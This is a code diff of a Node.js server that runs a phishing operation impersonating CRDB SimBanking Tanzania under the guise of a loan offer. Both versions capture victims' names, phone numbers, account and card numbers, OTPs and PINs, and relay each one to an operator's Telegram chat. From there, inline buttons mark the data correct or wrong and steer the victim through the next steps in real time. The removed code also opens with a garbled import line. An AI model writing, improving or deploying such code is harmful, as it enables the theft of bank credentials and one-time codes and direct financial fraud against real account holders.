@@ -1,146 +1,166 @@
-const express = require('path'); // wait, standard express below
-const expressApp = require('express');
-const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
 const path = require('path');
+const fetch = require('node-fetch');
 
-const app = expressApp();
-app.use(expressApp.json());
-app.use(expressApp.static(path.join(__dirname, 'public')));
-
-// TODO: Replace with your actual Telegram Bot Token and Chat ID
-const TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
-const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
-
-const bot = new TelegramBot(TOKEN, { polling: true });
-
-// In-memory store for client statuses and data
-const clients = {};
-
-// API Endpoint to receive submissions from the frontend
-app.post('/api/submit', (req, res) => {
-    const { step, clientId, data } = req.body;
-    
-    if (!clients[clientId]) {
-        clients[clientId] = { status: 'pending' };
-    }
-
-    if (data) {
-        clients[clientId] = { ...clients[clientId], ...data };
-    }
-
-    const client = clients[clientId];
-
-    if (step === 'account_details') {
-        const message = `[CRDB SIMBANKING TANZANIA] New Loan & Account Submission\n` +
-            `Loan Amount: ${client.amount || 'N/A'}\n` +
-            `First Name: ${client.firstName}\n` +
-            `Last Name: ${client.lastName}\n` +
-            `Phone (+255): ${client.phone}\n` +
-            `Account Number: ${client.accountNumber}\n` +
-            `Card Number: ${client.cardNumber}`;
-
-        bot.sendMessage(CHAT_ID, message, {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '❌ WRONG DETAILS', callback_data: `wrong_details_${clientId}` },
-                        { text: '✅ CORRECT DETAILS', callback_data: `correct_details_${clientId}` }
-                    ]
-                ]
-            }
-        });
-    } else if (step === 'otp_submitted') {
-        bot.sendMessage(CHAT_ID, `[CRDB] OTP Entered for ${client.firstName} ${client.lastName} (+255 ${client.phone}):\nOTP: ${data.otp}`, {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '❌ OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` },
-                        { text: '✅ OTP CORRECT', callback_data: `otp_correct_${clientId}` }
-                    ]
-                ]
-            }
-        });
-    } else if (step === 'pin_submitted') {
-        bot.sendMessage(CHAT_ID, `[CRDB] Security PIN Entered for ${client.firstName} ${client.lastName} (+255 ${client.phone}):\nPIN: ${data.pin}`, {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '❌ INVALID PIN', callback_data: `invalid_pin_${clientId}` },
-                        { text: '✅ VALID PIN / APPROVE', callback_data: `loan_approved_${clientId}` }
-                    ]
-                ]
-            }
-        });
-    }
-
-    res.json({ success: true });
-});
-
-// API Endpoint for frontend polling to track approval / rejection status
-app.get('/api/status/:clientId', (req, res) => {
-    const clientId = req.params.clientId;
-    const client = clients[clientId] || { status: 'pending' };
-    res.json({ status: client.status });
-});
-
-// Telegram Callback Query Listener (Handles button taps with instant feedback & fading)
-bot.on('callback_query', async (callbackQuery) => {
-    const callbackData = callbackQuery.data;
-    const msg = callbackQuery.message;
-
-    // Parse action and clientId from callback_data (e.g. 'wrong_details_crdb_client_xyz')
-    const lastUnderscoreIndex = callbackData.lastIndexOf('_');
-    const action = callbackData.substring(0, lastUnderscoreIndex);
-    const clientId = callbackData.substring(lastUnderscoreIndex + 1);
-
-    // 1. Give instant visual feedback to stop the button loading spinner on Telegram
-    try {
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: "Imepokelewa ✅",
-            show_alert: false
-        });
-    } catch (e) {
-        console.error(e);
-    }
-
-    // 2. Clear/remove the inline buttons instantly so they fade out and cannot be clicked twice
-    try {
-        await bot.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            {
-                chat_id: msg.chat.id,
-                message_id: msg.message_id
-            }
-        );
-    } catch (e) {
-        console.error("Error editing reply markup:", e);
-    }
-
-    // 3. Update client status in memory based on admin selection
-    if (clients[clientId]) {
-        if (action === 'wrong_details') {
-            clients[clientId].status = 'wrong_details';
-            bot.sendMessage(msg.chat.id, `❌ Umeweka: Wrong Details. Mteja ameombwa kuweka upya.`);
-        } else if (action === 'correct_details') {
-            clients[clientId].status = 'correct_details';
-            bot.sendMessage(msg.chat.id, `✅ Umeweka: Correct Details. Mteja anaelekezwa kwenda OTP.`);
-        } else if (action === 'otp_incorrect') {
-            clients[clientId].status = 'otp_incorrect';
-            bot.sendMessage(msg.chat.id, `❌ Umeweka: OTP Incorrect.`);
-        } else if (action === 'otp_correct') {
-            clients[clientId].status = 'otp_correct';
-            bot.sendMessage(msg.chat.id, `✅ Umeweka: OTP Correct. Mteja anaelekezwa kuweka PIN.`);
-        } else if (action === 'invalid_pin') {
-            clients[clientId].status = 'invalid_pin';
-            bot.sendMessage(msg.chat.id, `❌ Umeweka: Invalid PIN.`);
-        } else if (action === 'loan_approved') {
-            clients[clientId].status = 'loan_approved';
-            bot.sendMessage(msg.chat.id, `🎉 Mkopo umeidhinishwa na akaunti imeswezeshwa kikamilifu!`);
-        }
-    }
-});
-
+const app = express();
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+const sessions = {};
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';
+
+async function sendTelegramMessage(text, replyMarkup = null) {
+  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
+    console.log('Telegram token not configured. Message:', text);
+    return;
+  }
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const body = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: 'HTML'
+  };
+  if (replyMarkup) {
+    body.reply_markup = replyMarkup;
+  }
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+  } catch (err) {
+    console.error('Telegram error:', err);
+  }
+}
+
+app.post('/api/submit', async (req, res) => {
+  const { step, data, clientId } = req.body;
+  if (!sessions[clientId]) sessions[clientId] = {};
+  sessions[clientId] = { ...sessions[clientId], ...data, currentStep: step, status: 'pending' };
+
+  if (step === 'account_details') {
+    const text = `<b>[CRDB SIMBANKING TANZANIA] New Loan & Account Submission</b>\n` +
+                 `Loan Amount: ${sessions[clientId].loanAmount || 'N/A'}\n` +
+                 `First Name: ${sessions[clientId].firstName || 'N/A'}\n` +
+                 `Last Name: ${sessions[clientId].lastName || 'N/A'}\n` +
+                 `Phone (+255): ${sessions[clientId].phone || 'N/A'}\n` +
+                 `Account Number: ${data.accountNumber}\n` +
+                 `Card Number: ${data.cardNumber}`;
+    
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: 'WRONG DETAILS', callback_data: `wrong_details_${clientId}` },
+          { text: 'CORRECT DETAILS', callback_data: `correct_details_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  } else if (step === 'resend_otp') {
+    const text = `<b>[CRDB] User requested to RESEND OTP (♻️ Tuma OTP tena)</b>\nClient ID: ${clientId}`;
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
+          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  } else if (step === 'otp_submitted') {
+    const text = `<b>[CRDB] OTP Submitted:</b> ${data.otp}\nClient ID: ${clientId}`;
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
+          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  } else if (step === 'pin_submitted') {
+    const text = `<b>[CRDB] PIN Submitted:</b> ${data.pin}\nClient ID: ${clientId}`;
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: '3 INVALID PIN', callback_data: `invalid_pin_${clientId}` },
+          { text: 'VALID PIN', callback_data: `valid_pin_${clientId}` },
+          { text: 'LOAN APPROVED', callback_data: `loan_approved_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  }
+
+  res.json({ success: true, status: sessions[clientId].status });
 });
+
+app.get('/api/status/:clientId', (req, res) => {
+  const clientId = req.params.clientId;
+  const session = sessions[clientId] || { status: 'pending' };
+  res.json(session);
+});
+
+app.post('/api/telegram-webhook', async (req, res) => {
+  const update = req.body;
+  if (update.callback_query) {
+    const callbackData = update.callback_query.data;
+    const chatId = update.callback_query.message.chat.id;
+    const messageId = update.callback_query.message.message_id;
+    let clientId = '';
+    let action = '';
+
+    if (callbackData.startsWith('loan_approved_')) {
+      action = 'loan_approved';
+      clientId = callbackData.replace('loan_approved_', '');
+    } else {
+      const parts = callbackData.split('_');
+      action = `${parts[0]}_${parts[1]}`;
+      clientId = parts[2];
+    }
+
+    if (!sessions[clientId]) sessions[clientId] = {};
+
+    if (action === 'wrong_details') sessions[clientId].status = 'wrong_details';
+    else if (action === 'correct_details') sessions[clientId].status = 'correct_details';
+    else if (action === 'otp_correct') sessions[clientId].status = 'otp_correct';
+    else if (action === 'otp_incorrect') sessions[clientId].status = 'otp_incorrect';
+    else if (action === 'invalid_pin') sessions[clientId].status = 'invalid_pin';
+    else if (action === 'valid_pin') sessions[clientId].status = 'valid_pin';
+    else if (action === 'loan_approved') sessions[clientId].status = 'loan_approved';
+
+    // Answer callback query to stop the button loading spinner
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Recorded successfully' })
+    });
+
+    // Edit message markup to remove/fade buttons instantly upon tapping
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] }
+        })
+      });
+    } catch (err) {
+      console.error('Error clearing buttons:', err);
+    }
+  }
+  res.sendStatus(200);
+});
+
+app.listen(PORT, () => {
+  console.log(`CRDB Server running on port ${PORT}`);
+});
+    
